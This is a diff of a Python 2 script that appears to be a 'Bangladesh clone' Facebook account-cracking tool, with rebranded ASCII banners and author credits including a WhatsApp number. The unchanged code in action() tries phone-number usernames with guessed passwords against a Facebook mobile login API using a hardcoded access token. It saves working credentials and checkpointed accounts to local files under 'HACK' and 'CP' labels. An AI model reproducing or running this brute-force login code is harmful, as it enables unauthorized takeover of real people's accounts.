@@ -68,48 +68,57 @@ def cb():
 
 
 logo = psb("""
- \033[1;32m::::::::   ::::::::  :::    ::: ::::::::  
-\033[1;35m:+:    :+: :+:    :+: :+:   :+: :+:    :+: 
-\033[1;36m+:+    +:+        +:+ +:+  +:+  +:+    +:+ 
-\033[1;37m+#+    +:+     +#++:  +#++:++   +#+    +:+ 
-\033[1;31m+#+    +#+        +#+ +#+  +#+  +#+    +#+ 
-\033[1;36m#+#    #+# #+#    #+# #+#   #+# #+#    #+# 
-\033[1;33m########   ########  ###    ### ################
+ \033[1;32m::::    ::::      :::     ::::::::::: ::::    ::: :::    ::: :::        
+ \033[1;35m+:+:+: :+:+:+   :+: :+:       :+:     :+:+:   :+: :+:    :+: :+:        
+ \033[1;36m+:+ +:+:+ +:+  +:+   +:+      +:+     :+:+:+  +:+ +:+    +:+ +:+        
+ \033[1;37m+#+  +:+  +#+ +#++:++#++:     +#+     +#+ +:+ +#+ +#+    +:+ +#+        
+ \033[1;31m+#+       +#+ +#+     +#+     +#+     +#+  +#+#+# +#+    +#+ +#+        
+ \033[1;36m#+#       #+# #+#     #+#     #+#     #+#   #+#+# #+#    #+# #+#        
+ \033[1;33m###       ### ###     ### ########### ###    ####  ########  ########## 
+ 
+ 
+  \033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
 
- \033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
 	""")
 	
 logo = """
- \033[1;32m::::::::   ::::::::  :::    ::: ::::::::  
-\033[1;35m:+:    :+: :+:    :+: :+:   :+: :+:    :+: 
-\033[1;36m+:+    +:+        +:+ +:+  +:+  +:+    +:+ 
-\033[1;37m+#+    +:+     +#++:  +#++:++   +#+    +:+ 
-\033[1;31m+#+    +#+        +#+ +#+  +#+  +#+    +#+ 
-\033[1;36m#+#    #+# #+#    #+# #+#   #+# #+#    #+# 
- \033[1;33m########   ########  ###    ### ##############
+ \033[1;32m::::    ::::      :::     ::::::::::: ::::    ::: :::    ::: :::        
+ \033[1;35m+:+:+: :+:+:+   :+: :+:       :+:     :+:+:   :+: :+:    :+: :+:        
+ \033[1;36m+:+ +:+:+ +:+  +:+   +:+      +:+     :+:+:+  +:+ +:+    +:+ +:+        
+ \033[1;37m+#+  +:+  +#+ +#++:++#++:     +#+     +#+ +:+ +#+ +#+    +:+ +#+        
+ \033[1;31m+#+       +#+ +#+     +#+     +#+     +#+  +#+#+# +#+    +#+ +#+        
+ \033[1;36m#+#       #+# #+#     #+#     #+#     #+#   #+#+# #+#    #+# #+#        
+ \033[1;33m###       ### ###     ### ########### ###    ####  ########  ########## 
  
- \033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
+ 
+  \033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
+
 	"""
+	
+
 back = 0
 successful = []
 cpb = []
 oks = []
 id = []
 
+
 def menu():
     os.system('clear')
     print logo
     print ''
-    psb('\x1b[1;96m--------------------------------------------------')
-    psb('\x1b[1;92mAUTHOR  : MAINUL ISLAM ')
-    psb('\x1b[1;94mFACEBOOK : MD MAINUL ISLAM ')
-    psb('\x1b[1;97mGITHUB  : github.com/M41NUL')
-    psb('\x1b[1;96mFacebook Group : National Cyber Team')
-    psb('Bangladesh 11 Digital Clone')
+    psb('\033[1;36m--------------------------------------------------')
     print ''
-    print 50* '-'
-    psb('\x1b[1;97m--------------------------------------------------')
+    psb('\x1b[1;92mAUTHOR  : MAINUL')
+    psb('\x1b[1;92GITHUB  : github.com/MAINUL')
+    psb('\x1b[1;92FACEBOOK : MD MAINUL ISLAM')
+    psb('\x1b[1;92mYouTube : Technical Mainul')
+    psb('\x1b[1;92mWhatApps : +8801308850528')
+    print ''
+    psb('\033[1;36m--------------------------------------------------')
+    
     print
+    psb('\x1b[1;94m--------------------------------------------------')
     psb('\x1b[1;91mBANGLADESH ALL OPERETOR NETWORK')
     print
     psb('\x1b[1;92m[1]  GRAMEENPHONE(OLD)')
@@ -265,13 +274,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[MAINUL-HACK🔥]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[ MAINUL-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[MAINUL-CP😿]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
+                print '\x1b[1;93m[MAINUL-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
                 cps = open('MAINUL/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
@@ -286,7 +295,7 @@ def action():
     print
     print
     '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
-    print '[\xe2\x9c\x93] CP File Has Been Saved : O3KO/checkpoint.txt'
+    print '[\xe2\x9c\x93] CP File Has Been Saved : AT-71/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
     os.system('python2 Bangla.py')
 
